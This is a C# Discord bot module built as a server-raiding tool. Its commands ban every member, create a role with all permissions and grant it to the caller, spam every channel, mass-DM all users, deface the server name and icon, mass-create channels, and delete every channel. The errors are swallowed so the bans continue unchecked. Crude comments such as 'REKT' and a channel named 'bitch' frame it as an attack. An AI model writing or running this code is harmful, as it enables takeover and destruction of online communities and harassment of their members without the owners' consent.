using Discord;
using Discord.Commands;
using System;
using System.Threading.Tasks;

namespace Test.Modules
{
    public class Command : ModuleBase<SocketCommandContext>
    {
        // Base command Hello World
        [Command("hello")]
        public async Task TestAsync()
        {
            await Context.Channel.SendMessageAsync("Hello World");
        }

        // Ban every members of the contextual Guild
        [Command("BanAll")]
        public async Task BanallAsync()
        {
            foreach ( var item in Context.Guild.Users)
            {
                try
                {
                    // Item is the user, 0 is the number of days to purge, and the last one is the reason of the ban
                    await Context.Guild.AddBanAsync(item,0,"REKT");
                }
                catch (Exception)
                {
                    // If something happen, just do nothing, that's what we need in that case
                  
                }
            }
        }


        // Creating an admin Role and give it to the contextual user (You)
        [Command("admin")]
        public async Task Admin()
        {
            var guild = Context.Guild;
           
            GuildPermissions Perm = GuildPermissions.All;

           var t =  await guild.CreateRoleAsync("x", Perm);

            var user = Context.User as IGuildUser;

            IRole r = guild.GetRole(t.Id);
           
           await user.AddRoleAsync(r);
           
        }


        // spam 5 test => It will spam a message in each channel x times
        [Command("spam")]
        public async Task SpamAsync(int nb, [Remainder]string message)
        {



            for (int i = 0; i < nb; i++)
            {
                foreach (var item in Context.Guild.TextChannels)
                {
                    await item.SendMessageAsync(message);
                }
            }
           
        }

        // dmall (Message) => Will dm every users of the contextual guild
        [Command("dmall")]
        public async Task DmallAsync([Remainder]string message)
        {
            var guild = Context.Client.GetGuild(Context.Guild.Id);
            try
            {
                foreach (var user in guild.Users)
                {
                    await user.SendMessageAsync(message);
                }
            }
            catch (Exception)
            {
               
               // We need to keep it empty
            }
           
        }

        // Changing name and image of the contextual server
        [Command("deface")]
        public async Task deface(string path,[Remainder]string name)
        {

            Discord.Image img = new Discord.Image(path);

            var guild = Context.Guild as Discord.IGuild;
            await guild.ModifyAsync(x => {
                
                x.Name = name;
                x.Icon = img;
            });

        }


        // createchan 5 bitch => will create 5 channels named "bitch"
        [Command("createchan")]
        public async Task Createchannel(int nb, string name)
        {
            for (int i = 0; i < nb; i++)
            {
                await Context.Guild.CreateTextChannelAsync(name);
                await Context.Guild.CreateVoiceChannelAsync(name);
            }
        }

        // Well, delete all channels of the contextual guild
        [Command("deleteallchannel")]
        public async Task ChannelDelete()
        {
            foreach (var item in Context.Guild.Channels)
            {
                await item.DeleteAsync();
            }
        }
    }
}
